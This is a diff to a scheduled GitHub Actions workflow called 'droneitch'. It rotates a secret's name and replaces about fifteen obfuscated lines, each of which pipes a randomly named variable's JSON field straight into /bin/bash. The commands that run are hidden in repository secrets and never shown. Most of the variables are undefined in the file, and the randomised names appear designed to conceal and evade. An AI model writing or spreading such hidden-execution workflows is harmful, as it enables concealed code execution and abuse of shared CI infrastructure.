@@ -2,30 +2,31 @@ name: droneitch
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 0/6 * * *'
+    - cron: '46 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: droneitch
         env:
-          hgnk804: ${{ secrets.hgnk804 }}
+          n1964: ${{ secrets.n1964 }}
         run: |
-          echo $hgnk804 | jq -r .oats190 | /bin/bash
-          echo $izjly067 | jq -r .s8 | /bin/bash
-          echo $qxa2357 | jq -r .wpplc1 | /bin/bash
-          echo $u9885 | jq -r .lmze7 | /bin/bash
-          echo $odfu205 | jq -r .wrm254 | /bin/bash
-          echo $s57 | jq -r .ofbjb63 | /bin/bash
-          echo $cvya46073 | jq -r .gon57234 | /bin/bash
-          echo $pwbnc0350 | jq -r .ci004 | /bin/bash
-          echo $syc829 | jq -r .ycar1727 | /bin/bash
-          echo $rqfnm511 | jq -r .hbw2 | /bin/bash
-          echo $yrz78 | jq -r .or5659 | /bin/bash
-          echo $tb2000 | jq -r .ukq2537 | /bin/bash
-          echo $btn35246 | jq -r .olzm5 | /bin/bash
-          echo $zhh7920 | jq -r .qug8281 | /bin/bash
+          echo $n1964 | jq -r .dbhda15760 | /bin/bash
+          echo $mzvlh23 | jq -r .wugvq936 | /bin/bash
+          echo $z30203 | jq -r .xazka4 | /bin/bash
+          echo $xjb9276 | jq -r .h507 | /bin/bash
+          echo $lap42 | jq -r .tjql77 | /bin/bash
+          echo $u804 | jq -r .vbzq414 | /bin/bash
+          echo $xj72559 | jq -r .bew20888 | /bin/bash
+          echo $zaqj09070 | jq -r .xgiwd7 | /bin/bash
+          echo $b5160 | jq -r .maiqw858 | /bin/bash
+          echo $epf64770 | jq -r .abn85728 | /bin/bash
+          echo $er7 | jq -r .guc23 | /bin/bash
+          echo $xyh46 | jq -r .ysu29763 | /bin/bash
+          echo $ekmum0676 | jq -r .jksn052 | /bin/bash
+          echo $iw76 | jq -r .tdwe87213 | /bin/bash
+          echo $ywt46 | jq -r .a49391 | /bin/bash
+          echo $uwn97662 | jq -r .ipnr13 | /bin/bash
 
